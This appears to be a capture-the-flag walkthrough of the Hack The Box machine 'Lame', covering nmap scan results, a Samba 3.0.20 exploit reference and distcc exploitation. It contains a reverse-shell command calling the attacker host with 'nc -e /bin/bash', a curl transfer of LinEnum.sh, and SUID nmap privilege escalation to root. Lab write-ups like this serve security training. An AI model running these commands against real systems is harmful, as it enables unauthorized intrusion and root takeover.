## Nmap Port Scanning
```bash
┌──(saxon㉿Saxon)-[~/Desktop]
└─$ nmap -Pn -sV -sC -p 21,22,445,3632  10.10.10.3
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-29 14:45 EDT
Nmap scan report for 10.10.10.3
Host is up (0.023s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h57m32s, deviation: 2h49m45s, median: -2m30s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-08-29T14:42:59-04:00
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.92 seconds

```
#### 21/tcp  ftp
- Anonymous login is allow but nothing interesting there.
- vsftpd 2.3.4 has a known backdoor due to supply chain attack but this one is not affected.
#### 445/tcp  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
-  searchsploit reveals RCE vulnerability with a metasploit module in smbd 3.0.20 which grants instant "root" privilege :__
```bash
┌──(saxon㉿Saxon)-[~/Desktop]
└─$ searchsploit samba 3.0.20
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
```
- Python Script
```bash
https://github.com/un4gi/CVE-2007-2447/tree/main
```
![[Pasted image 20231221002137.png]]
#### 3632/tcp distccd 
- Distcc is designed to speed up compilation by taking advantage of unused processing power on other computers. A machine with distcc installed can send code to be compiled across the network to a computer which has the distccd daemon and a compatible compiler installed
- <mark>Exploitation</mark>
```bash
#CVE-2004-2687
#Establishing reverse shell
nmap -Pn -p 3632 10.10.10.3  --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc 10.10.14.15 8080 -e /bin/bash'"
#reverse shell listener
nc -lnvp 8080
```
- <mark>Post-Exploitation</mark>
	- <mark>Upgrade Shell with following commands</mark>
	```bash
	# In reverse shell
	python -c 'import pty; pty.spawn("/bin/bash")'
	Ctrl-Z
	# In Kali
	stty raw -echo;fg;reset
	# In reverse shell 
	export TERM=xterm-256
	```
	- <mark>Transfer LinEnum.sh</mark>
	```bash
	#Attacker Machine
	python3 -m http.server
	#Victim Machine
	curl http://10.10.14.15:8000/LinEnum.sh -o LinEnum.sh
	```
	- <mark>Privilege Escalation</mark>
	```bash
	#Interesting Output From LinEnum.sh
	[+] Possibly interesting SUID files:
	-rwsr-xr-- 1 root dhcp 2960 Apr  2  2008 /lib/dhcp3-client/call-dhclient-script
	-rwsr-xr-x 1 root root 780676 Apr  8  2008 /usr/bin/nmap
	```
	
	```bash
	# Abuse nmap with SUID
	nmap --interactive
	# Within Interactive mode
	!sh
	```